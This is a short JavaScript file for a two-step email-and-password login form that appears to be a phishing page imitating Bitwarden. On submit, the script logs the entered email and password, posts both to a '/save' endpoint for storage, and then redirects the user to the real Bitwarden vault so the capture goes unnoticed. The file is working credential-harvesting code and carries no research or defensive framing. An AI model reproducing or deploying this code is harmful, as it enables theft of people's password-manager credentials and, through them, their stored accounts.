const svg1 = document.getElementById('svg1');
const svg2 = document.getElementById('svg2');
const emailDisplay = document.getElementById('email-display');
const emailSection = document.getElementById('email-section');
const passSection  = document.getElementById('password-section')

document.getElementById('continue-button').addEventListener('click', function() {
    const emailInput = document.getElementById('email-input').value;
    if (!emailInput) {
        return;
    }
    emailSection.classList.toggle('tw-hidden');
    passSection.classList.toggle('tw-hidden');
    svg1.classList.toggle('tw-hidden');
    svg2.classList.toggle('tw-hidden');
    emailDisplay.textContent = emailInput;
});

document.getElementById('back-button').addEventListener('click', function() {
    emailSection.classList.toggle('tw-hidden');
    passSection.classList.toggle('tw-hidden');
    svg1.classList.toggle('tw-hidden');
    svg2.classList.toggle('tw-hidden');
});

document.getElementById('submit-button').addEventListener('click', function(event) {
    event.preventDefault();
    const emailInput = document.getElementById('email-input').value;
    const passwordInput = document.getElementById('password-input').value;
    if (!passwordInput) {
        return;
    }
    console.log('Email:', emailInput);
    console.log('Password:', passwordInput);

    // send post request to /save
    fetch('/save', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `email=${encodeURIComponent(emailInput)}&password=${encodeURIComponent(passwordInput)}`
    }).then(() => {
        // Redirect after storing data
        window.location.href = 'https://vault.bitwarden.com/';
    });
});
